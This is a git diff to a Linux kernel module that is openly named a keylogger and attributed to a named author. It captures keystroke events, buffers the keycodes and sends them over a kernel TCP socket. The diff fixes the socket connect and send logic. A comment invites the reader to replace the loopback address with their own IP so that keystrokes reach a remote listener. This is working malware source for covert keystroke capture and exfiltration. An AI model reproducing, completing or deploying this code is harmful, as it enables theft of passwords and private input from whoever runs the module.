@@ -13,19 +13,21 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Peter Derias z5311768");
 
-void keylogger_strcat(char *src, char *dst) {
+int keylogger_strcat(char *src, char *dst) {
     int i, j;
     for (i = 0; src[i] != '\0'; i++);
     for (j = i; dst[j - i] != '\0'; j++) {
         src[j] = dst[j - i];
     }
+    src[j] = '\0';
+    return j;
 }
 
 static int __init keylogger_init(void) {
     loff_t zero;
     char buf[20], pack[800];
     struct socket *sock = kmalloc(sizeof(*sock), GFP_KERNEL);
-    int err;        
+    int err, size;        
     int log, dev, i;
     mm_segment_t old_fs = get_fs();
     struct input_event ev;
@@ -47,7 +49,7 @@ static int __init keylogger_init(void) {
         if (ev.value == 1) {
             printk(KERN_INFO "%d, %d\n", ev.code, ev.value);
             snprintf(buf, 20, "%d\n", ev.code);
-            keylogger_strcat(pack, buf);
+            size = keylogger_strcat(pack, buf);
             // find the size needed
             dev = ev.code;
             for (log = 1; dev != 0; log++) {
@@ -58,10 +60,20 @@ static int __init keylogger_init(void) {
         if (i % 40 == 0) {
             // send me your data - well, this will send to 127.0.0.1 as a proof of concept. Change it for your needs.
             if (i == 0) {
+                struct sockaddr_in addr = {
+                    .sin_family = AF_INET,
+                    .sin_port = htons (61100),
+                    .sin_addr = { htonl (INADDR_LOOPBACK) } // change this line to your IP!
+                };
                 err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
                 if (err < 0) {
                         printk(KERN_INFO "failed tcp thingo\n");
                         printk(KERN_INFO "failed! I don't know what is the point of me, so kill me plz\n");
+                        break;
+                }
+                err = sock->ops->connect(sock, (struct sockaddr *) &addr, sizeof(addr), O_RDWR);
+                if (err < 0) {
+                        printk(KERN_INFO "failed to connect!\nerror is %d\n I don't know what is the point of me, so kill me plz\n", err);
                         break;
                 }
             }
@@ -79,19 +91,14 @@ static int __init keylogger_init(void) {
                 msg.msg_controllen = 0;
                 struct kvec vec;
                 vec.iov_base = pack;
-                vec.iov_len = sizeof(pack);
-                err = sock->ops->connect(sock, (struct sockaddr *) &addr, sizeof(addr), O_RDWR);
+                vec.iov_len = size;
 
-                if (err < 0) {
-                        printk(KERN_INFO "failed to connect!\nerror is %d\n I don't know what is the point of me, so kill me plz\n", err);
-                        break;
-                }
-                err = kernel_sendmsg(sock, &msg, &vec, (size_t) 1, (size_t) sizeof(pack));
+                err = kernel_sendmsg(sock, &msg, &vec, (size_t) 1, (size_t) size);
                 if (err < 0) {
                         printk(KERN_INFO "failed to send!\nerror is %d\n I don't know what is the point of me, so kill me plz\n", err);
                         break;
                 }
-                sock_release(sock);
+                pack[0] = '\0';
             }
         }
         i++;
